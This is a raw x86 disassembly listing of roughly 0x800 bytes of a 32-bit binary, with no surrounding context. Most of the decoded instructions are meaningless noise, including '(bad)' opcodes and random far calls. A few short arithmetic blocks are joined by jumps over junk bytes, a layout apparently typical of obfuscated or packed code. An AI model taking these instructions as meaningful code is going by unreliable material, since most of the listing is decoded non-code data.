  4187e8:	cmp    ecx,ebp
  4187ea:	adc    ebx,DWORD PTR [eax]
  4187ec:	add    DWORD PTR [eax],eax
  4187ee:	mov    dl,0x0
  4187f0:	add    BYTE PTR [eax],al
  4187f2:	mov    ebx,0x829eaf37
  4187f7:	out    dx,eax
  4187f8:	cwde   
  4187f9:	ret    0x1388
  4187fc:	sub    dh,BYTE PTR [edx]
  4187fe:	stos   BYTE PTR es:[edi],al
  4187ff:	(bad)  
  418800:	lock lods eax,DWORD PTR ds:[esi]
  418802:	test   al,0xd9
  418804:	xor    BYTE PTR [eax],bh
  418806:	cmc    
  418807:	fwait
  418808:	or     al,0xc7
  41880a:	or     ebx,DWORD PTR [esi+0x3a]
  41880d:	ret    
  41880e:	js     0x418817
  418810:	scas   eax,DWORD PTR es:[edi]
  418811:	lods   al,BYTE PTR ds:[esi]
  418812:	xchg   edx,eax
  418813:	cmp    DWORD PTR [edx+0x7ba9e555],ecx
  418819:	je     0x418851
  41881b:	pop    eax
  41881c:	jnp    0x418822
  41881e:	out    dx,al
  41881f:	mov    eax,0x6d169127
  418824:	inc    edx
  418825:	push   esp
  418826:	fiadd  DWORD PTR [esi-0x7f35b3eb]
  41882c:	xor    BYTE PTR [edi+0x5fbd7ea2],0x96
  418833:	inc    eax
  418834:	jb     0x418828
  418836:	(bad)  
  418837:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418838:	(bad)  
  418839:	mov    ebp,0xf518ee4c
  41883e:	mov    ds:0x481cc18b,al
  418843:	icebp  
  418844:	xchg   ecx,eax
  418845:	pop    edi
  418846:	pushf  
  418847:	mov    al,0x7e
  418849:	push   ecx
  41884a:	adc    ah,BYTE PTR [ebp-0x92ddfc4]
  418850:	gs or  eax,ebp
  418853:	loop   0x4187f7
  418855:	jmp    0xbbbd:0xbf43f584
  41885c:	ror    BYTE PTR [eax-0x54503a1b],cl
  418862:	inc    ecx
  418863:	inc    esi
  418864:	mov    ah,0x37
  418866:	das    
  418867:	pop    ecx
  418868:	arpl   dx,si
  41886a:	jo     0x418830
  41886c:	push   esi
  41886d:	pop    ebx
  41886e:	mov    al,0x3d
  418870:	into   
  418871:	popf   
  418872:	pop    es
  418873:	mov    edx,0x32178567
  418878:	ds data16 jbe 0x418824
  41887c:	scas   eax,DWORD PTR es:[edi]
  41887d:	icebp  
  41887e:	add    DWORD PTR [ecx-0x61],ecx
  418881:	mov    DWORD PTR [ecx+ebp*1-0x5a965c70],ebx
  418888:	fld    TBYTE PTR [edi+0xe]
  41888b:	shr    BYTE PTR [edx],0x89
  41888e:	ss cwde 
  418890:	repnz ds mov al,0x37
  418894:	out    dx,al
  418895:	push   ebp
  418896:	add    edi,DWORD PTR [ebp+0x4e]
  418899:	jno    0x418853
  41889b:	pusha  
  41889c:	push   esi
  41889d:	stos   BYTE PTR es:[edi],al
  41889e:	lods   eax,DWORD PTR ds:[esi]
  41889f:	mov    ds:0xcded0df6,eax
  4188a4:	je     0x418b6e
  4188aa:	mov    eax,DWORD PTR [ebp-0x58]
  4188ad:	mov    ecx,DWORD PTR [ebp-0x54]
  4188b0:	mov    edx,DWORD PTR [ebp-0x60]
  4188b3:	mov    esi,DWORD PTR [ebp-0x5c]
  4188b6:	add    eax,0x1147
  4188bb:	push   0x2298
  4188c0:	adc    ecx,0x50f3
  4188c6:	jmp    0x418995
  4188cb:	loop   0x4188ab
  4188cd:	pop    esi
  4188ce:	dec    edi
  4188cf:	jle    0x4188a0
  4188d1:	repz push DWORD PTR [edi]
  4188d4:	idiv   BYTE PTR [edx]
  4188d6:	int    0x2b
  4188d8:	cdq    
  4188d9:	addr16 sbb al,0xc5
  4188dc:	sbb    BYTE PTR [ecx],al
  4188de:	add    BYTE PTR [edx-0x3f000000],dh
  4188e4:	pop    esp
  4188e5:	das    
  4188e6:	sbb    DWORD PTR [ebx],ebx
  4188e8:	cli    
  4188e9:	xor    eax,0xe5e39869
  4188ee:	lods   eax,DWORD PTR ds:[esi]
  4188ef:	neg    BYTE PTR [ebp+eax*8+0x39bb85d0]
  4188f6:	fwait
  4188f7:	dec    ebp
  4188f8:	xchg   ebx,eax
  4188f9:	or     BYTE PTR [eax+0x36],ah
  4188fc:	cld    
  4188fd:	xchg   DWORD PTR [esi-0x16],ebx
  418900:	mov    ebp,DWORD PTR [edi-0x1b48b3ff]
  418906:	jecxz  0x418917
  418908:	mov    ebx,0x4071780c
  41890d:	push   es
  41890e:	add    al,0x99
  418910:	or     BYTE PTR [ebp-0x53],dl
  418913:	xchg   edx,eax
  418914:	popa   
  418915:	fucom  st(4)
  418917:	out    dx,al
  418918:	inc    esp
  418919:	jg     0x418977
  41891b:	ret    
  41891c:	xchg   esi,eax
  41891d:	scas   eax,DWORD PTR es:[edi]
  41891e:	inc    ah
  418920:	jb     0x41894e
  418922:	jl     0x418948
  418924:	adc    DWORD PTR [ebx+0x51],ebx
  418927:	(bad)  
  418928:	in     al,dx
  418929:	repz cli 
  41892b:	retf   0x85bf
  41892e:	mov    edi,0x80ac4e23
  418933:	cmp    al,0x3
  418935:	enter  0x26a,0xdb
  418939:	add    ebp,edx
  41893b:	mov    bh,0x6f
  41893d:	xor    al,0x54
  41893f:	call   0xc2e2f44a
  418944:	xor    BYTE PTR [edx+0x70dc81f9],dh
  41894a:	pop    ds
  41894b:	mov    bh,al
  41894d:	mov    al,0xbd
  41894f:	xor    al,0x7e
  418951:	mov    edi,edi
  418953:	pop    ds
  418954:	mov    BYTE PTR [esi],al
  418956:	mov    dl,0x13
  418958:	push   edx
  418959:	inc    esp
  41895a:	pop    ds
  41895b:	inc    esi
  41895c:	ret    
  41895d:	test   eax,0xede12a72
  418962:	or     al,0x7e
  418964:	jp     0x41894a
  418966:	jno    0x4189dc
  418968:	mov    dh,0xd3
  41896a:	xchg   esp,eax
  41896b:	div    eax
  41896d:	xor    al,0x44
  41896f:	mov    edi,0x396397a0
  418974:	pop    ebp
  418975:	fnstsw WORD PTR [eax]
  418977:	ret    0x488b
  41897a:	call   0xa6f5:0x3098f1fd
  418981:	ror    DWORD PTR ds:0x9bd3a32b,1
  418987:	fcomp  QWORD PTR [edi+0x5f]
  41898a:	test   DWORD PTR [ecx+0x4e604be4],ecx
  418990:	imul   edi,edx,0x684ab838
  418996:	inc    ebp
  418997:	add    eax,DWORD PTR [eax]
  418999:	add    BYTE PTR [ebx],ah
  41899b:	into   
  41899c:	jmp    0x418a6b
  4189a1:	lahf   
  4189a2:	jecxz  0x4189d3
  4189a4:	or     al,0x7f
  4189a6:	int3   
  4189a7:	mov    edi,0x39cb48f3
  4189ac:	imul   esp,ebx,0x777a87d0
  4189b2:	sbb    DWORD PTR [ecx],eax
  4189b4:	add    BYTE PTR [edx-0x2000000],dh
  4189ba:	pop    eax
  4189bb:	mov    esi,0xd5ed3a30
  4189c0:	out    dx,eax
  4189c1:	sub    eax,0x1317c4df
  4189c6:	gs push cs
  4189c8:	inc    esp
  4189c9:	out    dx,eax
  4189ca:	xor    eax,DWORD PTR [esi+0x33]
  4189cd:	xchg   ebx,eax
  4189ce:	cmp    eax,0x7b3e0064
  4189d3:	fcomp  DWORD PTR [ebx-0x2ce44a4c]
  4189d9:	repnz dec edi
  4189db:	bound  edx,QWORD PTR [edx+0x3bce5e57]
  4189e1:	fwait
  4189e2:	dec    ecx
  4189e3:	push   0xffffff9d
  4189e5:	(bad)  [edi-0x11]
  4189e8:	and    ah,bl
  4189ea:	retf   
  4189eb:	out    0xdc,eax
  4189ed:	push   edi
  4189ee:	call   0x7df0:0x4836dc19
  4189f5:	and    edx,DWORD PTR [esi+0x469cf8be]
  4189fb:	lods   eax,DWORD PTR ds:[esi]
  4189fc:	shr    eax,1
  4189fe:	in     eax,0x26
  418a00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a02:	gs xchg esp,eax
  418a04:	loope  0x4189c5
  418a06:	mov    dl,BYTE PTR [ebp*1+0x191afa0c]
  418a0d:	xlat   BYTE PTR ds:[ebx]
  418a0e:	rcr    BYTE PTR cs:[esi],0xd7
  418a12:	mov    ah,0xbb
  418a14:	lock push edi
  418a16:	clc    
  418a17:	leave  
  418a18:	loope  0x4189cd
  418a1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a1b:	inc    esp
  418a1c:	jle    0x4189f4
  418a1e:	ss mov ecx,0x6f2acb3a
  418a24:	mov    al,0x27
  418a26:	add    bh,BYTE PTR [edi-0x37]
  418a29:	xchg   edx,eax
  418a2a:	pop    es
  418a2b:	xlat   BYTE PTR ds:[ebx]
  418a2c:	push   ds
  418a2d:	dec    ecx
  418a2e:	fnstcw WORD PTR [esp+edx*4]
  418a31:	dec    edi
  418a32:	fwait
  418a33:	adc    ecx,0x7e0dc7ca
  418a39:	mov    ds:0x52cf351a,al
  418a3e:	lahf   
  418a3f:	in     eax,0xac
  418a41:	push   ecx
  418a42:	adc    DWORD PTR [eax],esi
  418a44:	cs ror edi,1
  418a47:	gs clc 
  418a49:	imul   edx,DWORD PTR [esi],0xffffff80
  418a4c:	xor    ebp,DWORD PTR [esi+0x7c]
  418a4f:	ja     0x418a29
  418a51:	test   BYTE PTR [edi],cl
  418a53:	hlt    
  418a54:	mov    esi,0x9c924f23
  418a59:	popf   
  418a5a:	mov    bh,bh
  418a5c:	jae    0x418a4a
  418a5e:	push   ebx
  418a5f:	sar    BYTE PTR [eax],1
  418a61:	jp     0x418a10
  418a63:	fadd   QWORD PTR [ebp+0x18]
  418a66:	dec    edx
  418a67:	mov    bl,0xe9
  418a69:	out    0x13,al
  418a6b:	and    eax,edx
  418a6d:	push   ecx
  418a6e:	push   eax
  418a6f:	call   0x42a3cf
  418a74:	mov    ecx,DWORD PTR ds:0x42f1b4
  418a7a:	mov    ecx,DWORD PTR [ecx+0x1c0]
  418a80:	mov    ecx,DWORD PTR [ecx]
  418a82:	jmp    0x418b51
  418a87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a88:	retf   0x4692
  418a8b:	(bad)  
  418a8c:	pop    esi
  418a8d:	hlt    
  418a8e:	jmp    0xd3bf:0x5fe48abe
  418a95:	push   ss
  418a96:	lahf   
  418a97:	sub    DWORD PTR [edx],ebx
  418a99:	add    DWORD PTR [eax],eax
  418a9b:	mov    dl,0x0
  418a9d:	add    BYTE PTR [eax],al
  418a9f:	lods   eax,DWORD PTR ds:[esi]
  418aa0:	fsub   QWORD PTR [ebx]
  418aa2:	popa   
  418aa3:	cmp    BYTE PTR cs:[esi-0x6f],al
  418aa7:	pop    ds
  418aa8:	push   esp
  418aa9:	test   esi,edx
  418aab:	popa   
  418aac:	dec    ebp
  418aad:	jnp    0x418a72
  418aaf:	add    ah,BYTE PTR [ecx-0x6a8d6808]
  418ab5:	adc    esi,edi
  418ab7:	cmp    eax,0xca0f394c
  418abc:	jl     0x418a4a
  418abe:	xor    esi,DWORD PTR [ecx]
  418ac0:	popa   
  418ac1:	xlat   BYTE PTR ds:[ebx]
  418ac2:	arpl   bx,di
  418ac4:	sub    eax,0x13629706
  418ac9:	repnz and esi,DWORD PTR [edi-0x6b9bf7bb]
  418ad0:	shl    BYTE PTR [edx+0x6d74a2a4],1
  418ad6:	repnz push DWORD PTR [eax]
  418ad9:	pop    ds
  418ada:	repnz lds esp,FWORD PTR [edi-0x5a]
  418ade:	fxch   st(0)
  418ae0:	jg     0x418a73
  418ae2:	xor    BYTE PTR [esi-0x39],0xda
  418ae6:	or     edx,DWORD PTR [edi+eiz*4-0x8c03909]
  418aed:	les    ebp,FWORD PTR [edx-0x7e76098d]
  418af3:	xor    BYTE PTR [ebx+0x42c0b793],ch
  418af9:	fs add eax,0xe500c173
  418aff:	ss loope 0x418aa5
  418b02:	arpl   WORD PTR [esi+0x4],bx
  418b05:	push   esp
  418b06:	push   ebx
  418b07:	(bad)  
  418b08:	mov    al,0x1d
  418b0a:	imul   ebp,DWORD PTR [ebp-0x27],0xe2b91724
  418b11:	loope  0x418b5d
  418b13:	xchg   DWORD PTR [ebx+0x21],ecx
  418b16:	or     ah,cl
  418b18:	in     al,dx
  418b19:	dec    ebx
  418b1a:	pop    esi
  418b1b:	sahf   
  418b1c:	xlat   BYTE PTR ds:[ebx]
  418b1d:	mov    ecx,DWORD PTR [edi-0x40]
  418b20:	jb     0x418aff
  418b22:	and    al,0x2a
  418b24:	popf   
  418b25:	rcl    ah,cl
  418b27:	and    al,cl
  418b29:	jle    0x418af5
  418b2b:	je     0x418acb
  418b2d:	jb     0x418ba4
  418b2f:	jo     0x418b7f
  418b31:	popa   
  418b32:	xchg   ebp,eax
  418b33:	(bad)  
  418b34:	cli    
  418b35:	daa    
  418b36:	sbb    DWORD PTR [edx+0x6e263327],edx
  418b3c:	add    BYTE PTR [ebx+0x37],0x15
  418b40:	stos   WORD PTR es:[edi],ax
  418b42:	dec    esp
  418b43:	lods   al,BYTE PTR ds:[esi]
  418b44:	cmp    eax,0x43d944bd
  418b49:	inc    eax
  418b4a:	dec    ebx
  418b4b:	outs   dx,DWORD PTR ds:[esi]
  418b4c:	push   es
  418b4d:	cmovns edx,DWORD PTR gs:[edx+0x6a0e235]
  418b55:	add    BYTE PTR [ecx-0x69144d0e],al
  418b5b:	add    DWORD PTR [ebx],esi
  418b5d:	idiv   BYTE PTR [ebx]
  418b5f:	enter  0x850f,0x37
  418b63:	or     eax,0xf23b0000
  418b68:	jne    0x41989d
  418b6e:	mov    eax,DWORD PTR [ebp-0x4]
  418b71:	or     eax,0x794b
  418b76:	add    eax,0x7173
  418b7b:	xor    edx,edx
  418b7d:	push   0x1b
  418b7f:	pop    ecx
  418b80:	div    ecx
  418b82:	jmp    0x418c51
  418b87:	test   bh,bl
  418b89:	and    ah,BYTE PTR [ebx+0x7b]
  418b8c:	inc    ebp
  418b8e:	(bad)  
  418b8f:	call   FWORD PTR [eax+0x758e9ffc]
  418b95:	mov    eax,ds:0x11adbbc
  418b9a:	add    BYTE PTR [edx+0x2000000],dh
  418ba0:	loopne 0x418c07
  418ba2:	and    DWORD PTR [ebx+0x2e],eax
  418ba5:	sub    DWORD PTR [esi+0x36],eax
  418ba8:	clc    
  418ba9:	jg     0x418b51
  418bab:	cmc    
  418bac:	fisub  WORD PTR [esi]
  418bae:	jno    0x418bdc
  418bb0:	ins    BYTE PTR es:[edi],dx
  418bb1:	shl    edx,0x9e
  418bb4:	shl    edi,1
  418bb6:	mov    ebp,0x28ba8de9
  418bbb:	pop    ecx
  418bbc:	repnz adc DWORD PTR [esp+ecx*8-0x12],ebp
  418bc1:	xchg   esi,eax
  418bc2:	das    
  418bc3:	mov    al,0x3d
  418bc5:	inc    eax
  418bc6:	fdiv   st,st(5)
  418bc8:	jne    0x418ba9
  418bca:	sbb    BYTE PTR [esi],ch
  418bcc:	jl     0x418b6f
  418bce:	adc    esp,esi
  418bd0:	jne    0x418baf
  418bd2:	pop    esp
  418bd3:	ja     0x418bb8
  418bd5:	jns    0x418c3d
  418bd7:	xlat   BYTE PTR ds:[ebx]
  418bd8:	fldenv [ecx-0x32b0ed92]
  418bde:	int    0x41
  418be0:	or     al,0x44
  418be2:	iret   
  418be3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418be4:	call   0x1b2c:0xd4385bfc
  418beb:	in     eax,dx
  418bec:	jl     0x418be1
  418bee:	aam    0x4b
  418bf0:	push   es
  418bf1:	xchg   edi,eax
  418bf2:	(bad)  
  418bf3:	retf   
  418bf4:	sbb    eax,0xb6539c1f
  418bf9:	mov    DWORD PTR [edi-0x694e225e],ebx
  418bff:	push   cs
  418c00:	data16 jg 0x418c57
  418c03:	in     eax,0xd4
  418c05:	mov    edx,0xe059a3bd
  418c0a:	dec    ecx
  418c0b:	stc    
  418c0c:	mov    ecx,0x6ad4c572
  418c11:	test   eax,0xa71c15dd
  418c16:	sbb    BYTE PTR [eax-0x7598a6d6],ah
  418c1c:	mov    es,ecx
  418c1e:	inc    eax
  418c1f:	jae    0x418c44
  418c21:	int    0x6c
  418c23:	fisub  DWORD PTR [ebx-0x7913a90b]
  418c29:	push   ecx
  418c2a:	adc    DWORD PTR ds:0xc476eb6f,0x4e
  418c31:	fiadd  WORD PTR [ecx-0x4cecafa5]
  418c37:	call   0xed23:0x70b94987
  418c3e:	and    BYTE PTR [ecx+0x63],ch
  418c41:	repz sbb ch,BYTE PTR [edi+edi*1]
  418c45:	or     DWORD PTR [edi],0x572eb9b8
  418c4b:	jo     0x418c70
  418c4d:	fistp  QWORD PTR [esi+edx*4+0x19]
  418c51:	mov    ecx,DWORD PTR [ebp-0x8]
  418c54:	xor    edx,edx
  418c56:	sub    eax,ecx
  418c58:	mov    ecx,DWORD PTR [ebp-0xc]
  418c5b:	or     eax,ecx
  418c5d:	mov    ecx,0xffffe7bf
  418c62:	sub    ecx,eax
  418c64:	mov    eax,ds:0x42f240
  418c69:	add    eax,ecx
  418c6b:	xor    DWORD PTR ds:0x42f238,eax
  418c71:	mov    eax,DWORD PTR [ebp-0x10]
  418c74:	jmp    0x418d43
  418c79:	imul   edx,DWORD PTR [ecx],0x6f
  418c7c:	repz jg 0x418c7e
  418c7f:	call   FWORD PTR [ecx-0x214085d4]
  418c85:	push   es
  418c86:	je     0x418c38
  418c88:	mov    esp,0x11b8d
  418c8d:	mov    dl,0x0
  418c8f:	add    BYTE PTR [eax],al
  418c91:	push   ds
  418c92:	push   ss
  418c93:	dec    ebp
  418c94:	jg     0x418ca0
  418c96:	sbb    BYTE PTR [edx-0x6b],ch
  418c99:	push   ecx
  418c9a:	inc    edi
  418c9b:	adc    DWORD PTR [edi+0x727a80dc],esi
  418ca1:	(bad)  
  418ca2:	fstp   DWORD PTR [ecx]
  418ca4:	scas   al,BYTE PTR es:[edi]
  418ca5:	fldcw  WORD PTR [ecx]
  418ca7:	xor    DWORD PTR ds:0xa66dd421,ebp
  418cad:	push   edx
  418cae:	xchg   ecx,eax
  418caf:	pop    ss
  418cb0:	ins    BYTE PTR es:[edi],dx
  418cb1:	popa   
  418cb2:	xchg   BYTE PTR ds:0xb0aa03b5,ah
  418cb8:	pop    eax
  418cb9:	cmp    al,0xc0
  418cbb:	dec    ebp
  418cbc:	or     al,dh
  418cbe:	push   edx
  418cbf:	mov    ds:0xe5f7932c,al
  418cc4:	imul   esp
  418cc6:	call   0xb19:0xd422d04d
  418ccd:	mov    eax,ds:0xc847371a
  418cd2:	inc    esi
  418cd3:	inc    esp
  418cd4:	mul    cl
  418cd6:	repnz cmp bh,bh
  418cd9:	clc    
  418cda:	not    DWORD PTR [ebp-0x57]
  418cdd:	stc    
  418cde:	mov    BYTE PTR [esi-0x5be3f63a],dh
  418ce4:	nop
  418ce5:	jle    0x418c75
  418ce7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ce8:	mov    edx,0xa46d0bdd
  418ced:	adc    eax,0xb65ee058
  418cf2:	enter  0xfe6f,0x83
  418cf6:	dec    ebp
  418cf7:	ss inc esp
  418cf9:	out    dx,eax
  418cfa:	in     eax,dx
  418cfb:	xor    al,0xce
  418cfd:	xlat   BYTE PTR ds:[ebx]
  418cfe:	or     bh,bl
  418d00:	jge    0x418cb9
  418d02:	xor    eax,0x311d8f59
  418d07:	add    esi,DWORD PTR [eax-0x61c0d8e2]
  418d0d:	cmp    ebp,DWORD PTR [eax]
  418d0f:	inc    esi
  418d10:	(bad)  
  418d11:	jb     0x418d00
  418d13:	test   eax,0x9688c59c
  418d18:	(bad)  
  418d19:	dec    BYTE PTR cs:[eax+0x5c]
  418d1d:	ror    BYTE PTR [ecx-0x42cb9af6],cl
  418d23:	loopne 0x418d50
  418d25:	scas   al,BYTE PTR es:[edi]
  418d26:	push   ss
  418d27:	inc    ecx
  418d28:	mov    bl,0xfa
  418d2a:	in     eax,dx
  418d2b:	(bad)  
  418d2c:	fcomp  DWORD PTR [esi-0x2]
  418d2f:	inc    ecx
  418d30:	js     0x418d72
  418d32:	outs   dx,BYTE PTR ds:[esi]
  418d33:	add    DWORD PTR [ebx+0x5e],esi
  418d36:	ret    0x75ca
  418d39:	mov    dh,0xf1
  418d3b:	in     eax,dx
  418d3c:	xor    ebx,DWORD PTR [esp+ecx*2]
  418d3f:	dec    edx
  418d40:	leave  
  418d41:	cld    
  418d42:	or     BYTE PTR [ebx-0x24fa13b3],0x3c
  418d49:	add    BYTE PTR [eax],al
  418d4b:	jmp    0x418e1a
  418d50:	cmp    al,0xfb
  418d52:	in     al,0x8f
  418d54:	out    0x9f,eax
  418d56:	jg     0x418d53
  418d58:	fucomip st,st(5)
  418d5a:	adc    al,0x9f
  418d5c:	mov    ah,0x35
  418d5e:	mov    eax,0x11c3f6e
  418d63:	add    BYTE PTR [edx+0x5b000000],dh
  418d69:	jle    0x418d8b
  418d6b:	cmp    dh,dl
  418d6d:	sti    
  418d6e:	aas    
  418d6f:	jmp    0x7880e3e1
  418d74:	or     dh,BYTE PTR [eax+ebx*8]
  418d77:	and    bh,al
  418d79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d7a:	or     ebp,DWORD PTR [edi-0x2e201e22]
  418d80:	lea    esp,[ebx-0x17]
  418d83:	adc    al,0xf8
  418d85:	dec    edi
  418d86:	push   cs
  418d87:	xchg   ebp,eax
  418d88:	mov    ds:0x913d2dd8,al
  418d8d:	mov    ds:0x4cf1f239,al
  418d92:	inc    esp
  418d93:	push   edx
  418d94:	call   0xe3d6:0xa7a83fa3
  418d9b:	neg    BYTE PTR [edx+esi*4-0x35d2b01e]
  418da2:	and    eax,0x7471038c
  418da7:	shr    BYTE PTR [ebx-0x9],cl
  418daa:	xchg   BYTE PTR [edx],ch
  418dac:	(bad)  
  418dae:	mov    esp,0x8a479617
  418db3:	lahf   
  418db4:	mov    edi,0x8be9ebc9
  418db9:	hlt    
  418dba:	popa   
  418dbb:	mov    WORD PTR [eax],fs
  418dbd:	iret   
  418dbe:	lahf   
  418dbf:	mov    ecx,0x466fef6e
  418dc4:	or     cl,al
  418dc6:	pushf  
  418dc7:	jb     0x418d6f
  418dc9:	xor    eax,DWORD PTR [esi]
  418dcb:	mov    ds:0x48cdb3fd,al
  418dd0:	test   al,0xee
  418dd2:	sbb    eax,0x4880b9c0
  418dd7:	xchg   ebp,eax
  418dd8:	sbb    DWORD PTR [edi-0xb],ecx
  418ddb:	mov    ah,0xd8
  418ddd:	rol    DWORD PTR [ecx+0x6d],0xb7
  418de1:	aam    0x61
  418de3:	mov    ?,WORD PTR [ecx+0x76e82c6a]
  418de9:	or     BYTE PTR ds:0xdf9a60b9,al
  418def:	loope  0x418e31
  418df1:	loop   0x418db1
  418df3:	pop    esi
  418df4:	lock in eax,dx
  418df6:	jmp    0x61ea:0x67672068
  418dfd:	mov    bl,0x38
  418dff:	mov    ds:0x1c3b23e8,eax
  418e04:	jno    0x418e03
  418e06:	dec    eax
  418e07:	mov    al,0x6
  418e09:	rcl    DWORD PTR [eax+eiz*4+0x74],cl
  418e0d:	push   ecx
  418e0e:	mov    bl,0x4f
  418e10:	imul   esi,DWORD PTR [ebx],0x674f7f0f
  418e16:	sbb    edx,DWORD PTR [edi+0x7e]
  418e19:	mov    al,0xd
  418e1b:	push   es
  418e1c:	jns    0x418e1e
  418e1e:	add    BYTE PTR [ebx],ch
  418e20:	ror    DWORD PTR [ebx-0x351617b3],0x0
  418e27:	add    BYTE PTR [eax],al
  418e29:	fld    QWORD PTR [esi-0x15]
  418e2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e2d:	sti    
  418e2e:	lods   eax,DWORD PTR ds:[esi]
  418e2f:	fistp  QWORD PTR [esi-0x41]
  418e32:	mov    esi,0xa46acdaf
  418e37:	or     eax,0x11cf169
  418e3c:	add    BYTE PTR [edx+0x7e000000],dh
  418e42:	fsubr  DWORD PTR [edi]
  418e44:	push   0x61
  418e46:	mov    esp,0x7195f0c8
  418e4b:	hlt    
  418e4c:	cld    
  418e4d:	sbb    ch,BYTE PTR [ebp+0x20]
  418e50:	cmp    ebp,DWORD PTR [edx]
  418e52:	jl     0x418de0
  418e54:	test   eax,0x591bdaa2
  418e59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e5a:	div    DWORD PTR [edx]
  418e5c:	push   edx
  418e5d:	pop    eax
  418e5e:	or     eax,ecx
  418e60:	rcl    DWORD PTR cs:[edi],cl
  418e63:	popf   
  418e64:	mov    dl,0x14
  418e66:	cdq    
  418e67:	jg     0x418e39
  418e69:	mov    cl,0x5a
  418e6b:	adc    dl,al
  418e6d:	or     al,0x2f
  418e6f:	test   eax,0x8b43d297
  418e74:	(bad)  
  418e75:	sub    eax,0xb50c847e
  418e7a:	sbb    al,0xc6
  418e7c:	adc    BYTE PTR [edx-0x10],dh
  418e7f:	mov    ebx,fs
  418e81:	test   BYTE PTR [eax],al
  418e83:	dec    ecx
  418e84:	lea    edx,[ebx-0x3f]
  418e87:	push   0x58c31b4f
  418e8c:	push   ebp
  418e8d:	dec    eax
  418e8e:	shr    DWORD PTR [esi+0x714c9097],1
  418e94:	dec    ebp
  418e95:	lods   eax,DWORD PTR ds:[esi]
  418e96:	shl    DWORD PTR [ecx],0xae
  418e99:	ficomp DWORD PTR [ebp-0x23e5f225]
  418e9f:	daa    
  418ea0:	shr    BYTE PTR [ebx],0x7d
  418ea3:	mov    dh,BYTE PTR [ebp+ecx*4+0xe31e51d]
  418eaa:	das    
  418eab:	ffreep st(6)
  418ead:	jl     0x418eee
  418eaf:	test   BYTE PTR cs:[esi+0x24],bh
  418eb3:	push   ds
  418eb4:	retf   
  418eb5:	popf   
  418eb6:	jb     0x418e3f
  418eb8:	les    ecx,FWORD PTR [ebx+edx*4-0x589ce735]
  418ebf:	aas    
  418ec0:	jne    0x418ec8
  418ec2:	push   es
  418ec3:	jns    0x418e4d
  418ec5:	inc    ebp
  418ec6:	outs   dx,BYTE PTR ds:[esi]
  418ec7:	call   DWORD PTR [eax+0xea3753c]
  418ecd:	mov    ebp,0x8b499a51
  418ed2:	dec    edi
  418ed3:	popa   
  418ed4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418ed5:	sahf   
  418ed6:	fwait
  418ed7:	ins    DWORD PTR es:[edi],dx
  418ed8:	fdivr  QWORD PTR [ebp+0x326bb1cc]
  418ede:	add    BYTE PTR [ecx+eiz*8-0x70],ah
  418ee2:	lods   eax,DWORD PTR ds:[esi]
  418ee3:	in     eax,dx
  418ee4:	data16 xor al,0x1b
  418ee7:	imul   esp
  418ee9:	push   esi
  418eea:	mov    ecx,0x78a3a8e6
  418eef:	adc    DWORD PTR [ecx],edx
  418ef1:	pusha  
  418ef2:	ins    DWORD PTR es:[edi],dx
  418ef3:	xor    eax,0x209e
  418ef8:	div    ecx
  418efa:	mov    ecx,DWORD PTR [ebp-0x1c]
  418efd:	jmp    0x418fcc
  418f02:	jb     0x418f69
  418f04:	fsubrp st(5),st
  418f06:	(bad)  
  418f08:	jnp    0x418f01
  418f0a:	sub    BYTE PTR [edx+0x52],ah
  418f0d:	mov    eax,ds:0x659ffabb
  418f12:	mov    ds:0xb200011d,eax
  418f17:	add    BYTE PTR [eax],al
  418f19:	add    BYTE PTR [eax+0x13],dh
  418f1c:	mov    bl,0x2d
  418f1e:	push   ebx
  418f1f:	adc    edx,ebx
  418f21:	jne    0x418f69
  418f23:	dec    ecx
  418f24:	ss cmp eax,0xdd93cfb6
  418f2a:	pop    ecx
  418f2b:	pusha  
  418f2c:	aam    0x2a
  418f2e:	gs mov al,0x2c
  418f31:	test   DWORD PTR [edi],esi
  418f33:	repz in eax,dx
  418f35:	mov    DWORD PTR [eax+eiz*8],ebp
  418f38:	push   edi
  418f39:	mov    ds:0x4571e0ec,eax
  418f3e:	dec    ecx
  418f3f:	stos   DWORD PTR es:[edi],eax
  418f40:	adc    DWORD PTR [edi-0x16a483a8],edx
  418f46:	jae    0x418f15
  418f48:	sub    eax,DWORD PTR [esi+0x79]
  418f4b:	cdq    
  418f4c:	push   ebx
  418f4d:	add    edi,DWORD PTR [eax-0x3443a0d7]
  418f53:	mov    dl,0xec
  418f55:	lock loope 0x418f01
  418f58:	inc    esp
  418f59:	test   DWORD PTR [ebp-0x28cfc17b],esp
  418f5f:	jl     0x418f61
  418f61:	push   ss
  418f62:	fwait
  418f63:	push   ebx
  418f64:	inc    esp
  418f65:	mov    ch,BYTE PTR [edi+eax*4]
  418f68:	mov    ds:0xab0a7e3d,eax
  418f6d:	inc    ecx
  418f6e:	add    dh,bh
  418f70:	pop    ecx
  418f71:	fstp   QWORD PTR [edx+0x3619bedf]
  418f77:	call   0xf705:0x7f2d9747
  418f7e:	jp     0x418f0e
  418f80:	rcl    DWORD PTR [edx+0x51],0xaf
  418f84:	adc    edi,DWORD PTR [ebp-0x5fe8bb85]
  418f8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f8b:	es dec esp
  418f8d:	aad    0xf6
  418f8f:	pop    ebx
  418f90:	test   DWORD PTR [edi],eax
  418f92:	sub    DWORD PTR ds:0x51d36ab5,esp
  418f98:	sub    eax,0xfeceb058
  418f9d:	pop    ss
  418f9e:	jb     0x418f4a
  418fa0:	(bad)  [eax-0x6ea50ad8]
  418fa6:	pop    esp
  418fa7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418fa8:	sar    ebp,0xba
  418fab:	iret   
  418fac:	ins    DWORD PTR es:[edi],dx
  418fad:	push   esp
  418fae:	or     bh,BYTE PTR [eax+0x30]
  418fb1:	mov    esi,0xd771e3f
  418fb6:	mov    esp,DWORD PTR [esi]
  418fb8:	cld    
  418fb9:	in     al,dx
